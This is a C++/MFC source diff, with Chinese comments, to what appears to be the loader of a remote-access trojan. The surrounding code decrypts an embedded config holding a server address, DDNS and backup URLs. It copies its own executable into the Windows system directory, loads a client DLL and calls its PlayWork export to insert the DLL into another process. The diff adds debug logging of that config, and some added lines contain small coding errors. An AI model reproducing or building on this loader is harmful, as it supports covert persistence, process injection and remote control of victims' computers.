@@ -31,8 +31,15 @@ END_MESSAGE_MAP()
 CPcStatApp::CPcStatApp()
 {
 	memset(&m_Info, 0, sizeof(m_Info));
+#pragma warning(disable:4996)   // 这个很重要,防止提示编译错误.
+	//AllocConsole();
+	//freopen("CONOUT$", "w+t", stdout);
 }
 
+CPcStatApp::~CPcStatApp() {
+	//fclose(stdout);
+	//FreeConsole();
+}
 /////////////////////////////////////////////////////////////////////////////
 // The one and only CPcStatApp object
 
@@ -41,6 +48,16 @@ CPcStatApp theApp;
 /////////////////////////////////////////////////////////////////////////////
 // CPcStatApp initialization
 
+static void WriteLog(char* pText)
+{
+	FILE* fp = fopen("pstatlog.txt", "a");
+	if (fp != NULL)
+	{
+		fwrite(pText, strlen(pText), 1, fp);
+		fwrite("\n", 2, 1, fp);
+		fclose(fp);
+	}
+}
 #ifdef _DEBUG
 void WriteLog(char* pText)
 {
@@ -65,12 +82,22 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd , LPARAM lParam)
 	}
 	return TRUE;
 }
+void prinfhandelinfo(LPINITDLLINFO p_info) {
+	char message[512];
+
+	sprintf(message," serverport :%d processid:%d dllfilelen:%d,m_ProcessName0 %d,  pname:%s keyname:%s\n ctrlfile %s startFile %s m_ServerAddr %s parentFile %s EventName:%s ddnsUrl :%s bakURL :%s update:%d,ext :% sm_reserved ：%s\n",
+		p_info->m_ServerPort, p_info->m_ProcessId, p_info->m_DllFileLen, p_info->m_ProcessName[0],p_info->m_ProcessName, p_info->m_KeyName, p_info->m_CtrlFile, p_info->m_StartFile,
+		p_info->m_ServerAddr, p_info->m_ParentFile, p_info->m_EventName, p_info->m_DdnsUrl, p_info->m_BakUrl, p_info->m_IsUpdate, p_info->m_ext, p_info->m_reserved);
+	WriteLog(message);
+}
 
 void CPcStatApp::InsertDllToProcess(HMODULE m_Module)
 {
 	//取导出函数
 	PLAYWORK PlayWork = (PLAYWORK) GetProcAddress(m_Module,"PlayWork");
 	if(PlayWork == NULL) return ;
+	WriteLog("get play work function\n");
+	prinfhandelinfo(&m_Info);
 	
 	if(m_Info.m_ProcessName[0] == 0)
 	{
@@ -123,8 +150,13 @@ void CPcStatApp::InsertDllToProcess(HMODULE m_Module)
 	if(PlayWork(&m_Info))
 	{
 		EnumWindows(EnumWindowsProc,m_Info.m_ProcessId);
+		WriteLog("777\n");
+		char message[256];
+		sprintf(message, "myprocessid :%d\n", m_Info.m_ProcessId);
+		WriteLog(message);
 		WaitForSingleObject(m_ExitEvent,INFINITE);
 	}
+	WriteLog("&&&&77670");
 
 	//关闭等待事件句柄
 	CloseHandle(m_ExitEvent);
@@ -179,20 +211,25 @@ BOOL CPcStatApp::LoadInitInfo(char* pFileName)
 	//取当前EXE文件名称
 	char m_ExeFileName[256] = {0};
 	GetModuleFileName(NULL,m_ExeFileName,200);
+	char message[256];
+	snprintf(message,256, "m_ExeFileName :%s\n", m_ExeFileName);
+	WriteLog(message);
     //取当前可执行程序的路径
-    for (int i = strlen(m_ExeFileName); i >= 0; --i)
-    {
-        if (m_ExeFileName[i] == '\\')
-        {
-            m_ExeFileName[i] = 0;
-            break;
-        }
-    }
+ //   for (int i = strlen(m_ExeFileName); i >= 0; --i)
+ //   {
+ //       if (m_ExeFileName[i] == '\\')
+ //       {
+ //           m_ExeFileName[i] = 0;
+ //           break;
+ //       }
+ //   }
 
-    CStringA strClientFileName;
-    strClientFileName.Format("%s\\ps.exe", m_ExeFileName);
-	strcpy_s(m_ExeFileName, 256, strClientFileName);
-	
+ //   CStringA strClientFileName;
+ //   strClientFileName.Format("%s\\ps.exe", m_ExeFileName);
+	//strcpy_s(m_ExeFileName, 256, strClientFileName);
+	////char message[256];
+	//snprintf(message, 256, "m_ExeFileName :%s\n", m_ExeFileName);
+	//WriteLog(message);
 	//读文件数据
 	INITDLLINFO m_TmpFileInfo = {0}, m_FileInfo = {0};
 	FILE* fp = fopen(m_ExeFileName, "rb");
@@ -216,10 +253,10 @@ BOOL CPcStatApp::LoadInitInfo(char* pFileName)
 	Des_Go((char*) &m_FileInfo, (char*) &m_TmpFileInfo, 
 		sizeof(INITDLLINFO), m_DesKey, 8, DECRYPT_);//解密
 	memcpy(&m_Info, &m_FileInfo, sizeof(INITDLLINFO));
-
+	
 	strcpy(m_Info.m_ParentFile, m_ExeFileName);
 	strcpy(m_Info.m_EventName,AfxGetAppName());
-
+	prinfhandelinfo(&m_Info);
 	//if(m_Info.m_IsUpdate == 0)
 	//{
 	//	//启动文件
@@ -237,7 +274,7 @@ BOOL CPcStatApp::LoadInitInfo(char* pFileName)
 	//取连接库文件
 	if(!GetInsertDllFile(m_ExeFileName, pFileName, m_Info.m_DllFileLen))
 		return FALSE;
-
+	WriteLog("3 data is youxiao \n");
 	//取文件名
 	char* pFind = strrchr(m_Info.m_ParentFile,'\\');
 	if(pFind == NULL) return FALSE;
@@ -247,6 +284,9 @@ BOOL CPcStatApp::LoadInitInfo(char* pFileName)
 	char m_SystemPath[256] = {0};
 	GetSystemDirectory(m_SystemPath,200);
 	sprintf(m_DesFile, "%s%s", m_SystemPath, pFind);
+	char message1[512];
+	snprintf(message1, 512, "4 source %s  desc %s", m_Info.m_ParentFile, m_DesFile);
+	WriteLog(message1);
     if (!CopyFile(m_Info.m_ParentFile, m_DesFile, FALSE))
     {
         ::MessageBoxW(NULL, L"拷贝文件ps.exe失败", L"错误", MB_OK | MB_ICONERROR);
@@ -389,9 +429,10 @@ BOOL CPcStatApp::InitInstance()
 
 	//装载连接dll
 	//HMODULE m_Module = LoadLibrary(m_FileName);
-	HMODULE m_Module = LoadLibrary("PcClient.dll");
+	WriteLog(m_FileName);
+	HMODULE m_Module = LoadLibrary(m_FileName);
 	if(m_Module == NULL) return FALSE;
-
+	WriteLog("load model success\n");
 	//启动连接
 	InsertDllToProcess(m_Module);
 
